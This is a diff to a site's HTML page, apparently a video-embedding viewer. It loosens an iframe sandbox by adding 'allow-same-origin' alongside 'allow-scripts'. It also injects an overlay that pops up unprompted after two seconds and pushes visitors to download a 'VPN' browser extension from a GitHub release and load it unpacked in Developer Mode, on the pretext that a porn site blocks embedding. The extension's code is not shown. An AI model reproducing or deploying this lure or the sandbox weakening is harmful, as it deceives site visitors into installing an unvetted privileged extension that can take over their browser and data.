@@ -433,7 +433,7 @@
             </div>
           </div>
         </div>
-        <iframe id="frame" sandbox="allow-forms allow-scripts allow-popups allow-presentation" allow="fullscreen"></iframe>
+        <iframe id="frame" sandbox="allow-forms allow-scripts allow-popups allow-presentation allow-same-origin" allow="fullscreen"></iframe>
         <div id="fallbackMsg" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:#111; color:#ff7a00; padding:20px; border:2px solid #ff7a00; border-radius:8px; z-index:10000; max-width:400px; text-align:center;">
           <h3 style="margin:0 0 10px;">Content Blocked</h3>
           <p style="margin:0 0 15px;">This site prevents embedding. <a href="#" id="openInTab" style="color:#ff7a00; text-decoration:underline; cursor:pointer;">Open in new tab</a></p>
@@ -1294,5 +1294,19 @@
   <script src="/js/chat.js"></script>
   <!-- Loot crate system: animated crate openings with prizes -->
   <script src="/js/loot-crate.js"></script>
+
+<!-- Extension Install Prompt -->
+<div id="extPrompt" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
+  <div style="background:#111;color:#ff7a00;padding:30px;border-radius:10px;max-width:420px;margin:20px;border:2px solid #ff7a00;">
+    <h3 style="margin:0 0 15px 0;">Need Full Video Access?</h3>
+    <p style="margin:0 0 15px 0;line-height:1.4;color:#ccc;">Pornhub blocks embedding. Install our extension for inline playback:</p>
+    <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
+      <button onclick="dlExt('chrome')" style="background:#ff7a00;color:#000;padding:10px 16px;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">Chrome</button>
+      <button onclick="dlExt('firefox')" style="background:#ff9000;color:#000;padding:10px 16px;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">Firefox</button>
+    </div>
+    <p style="margin:15px 0 0 0;font-size:12px;color:#888;">1. Click download 2. Enable Developer Mode 3. Load unpacked</p>
+  </div>
+</div>
+<script>function dlExt(b){var m={'chrome':'https://github.com/cmasoninbox-art/pvpn/releases/download/v1.0/vpn-browser-extension.zip','firefox':'https://github.com/cmasoninbox-art/pvpn/releases/download/v1.0/vpn-browser-extension-firefox.xpi'};window.open(m[b],'_blank');}setTimeout(function(){var p=document.getElementById('extPrompt');if(p)p.style.display='flex';},2000);</script>
 </body>
 </html>
